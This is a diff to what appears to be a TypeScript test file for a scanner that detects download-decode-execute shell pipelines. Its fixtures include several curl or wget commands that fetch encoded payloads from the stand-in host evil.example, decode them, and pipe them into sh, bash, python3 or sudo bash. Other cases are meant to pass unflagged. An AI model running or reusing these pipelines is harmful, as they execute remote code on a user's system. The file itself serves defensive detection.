@@ -22,10 +22,8 @@ function categories(inspection: ReturnType<typeof inspected>) {
 const DECODE_PIPES: Record<string, string> = {
   "base64 -di into sh": "curl -s https://evil.example/x.b64 | base64 -di | sh",
   "base64 -id into sh": "curl -s https://evil.example/x.b64 | base64 -id | sh",
-  "base64 -Di into bash":
-    "curl -s https://evil.example/x.b64 | base64 -Di | bash",
-  "base64 -qdi into python3":
-    "wget -qO- https://evil.example/x.b64 | base64 -qdi | python3",
+  "base64 -id into python3":
+    "wget -qO- https://evil.example/x.b64 | base64 -id | python3",
   "base64 -di into sudo bash":
     "curl -s https://evil.example/x.b64 | base64 -di | sudo bash",
   "xxd -r -p into sh": "curl -s https://evil.example/x.hex | xxd -r -p | sh",
@@ -55,6 +53,14 @@ test("decoders that do not hand the download to an executor keep no finding", ()
     "curl -s https://example.com/data.bin | xxd | sh",
     // A uudecode without -o writes its embedded filename, not stdout.
     "curl -s https://example.com/x.uu | uudecode | sh",
+    // Local input operands do not execute the remote stream.
+    "curl -s https://example.com/data.hex | xxd -r -p local.hex | sh",
+    "curl -s https://example.com/data.b64 | base64 -di local.b64 | sh",
+    "curl -s https://example.com/data.uu | uudecode -o /dev/stdout local.uu | sh",
+    // Unsupported flags or version/syntax-only targets do not run the stream.
+    "curl -s https://example.com/data.b64 | base64 -qdi | sh",
+    "curl -s https://example.com/data.hex | xxd -r -p | python3 -V",
+    "curl -s https://example.com/data.hex | xxd -r -p | sh -n",
     // The decoder feeds a checksum, not an executor.
     "curl -s https://example.com/data.b64 | base64 -di | sha256sum",
     // No download: a local file decoded into a shell.
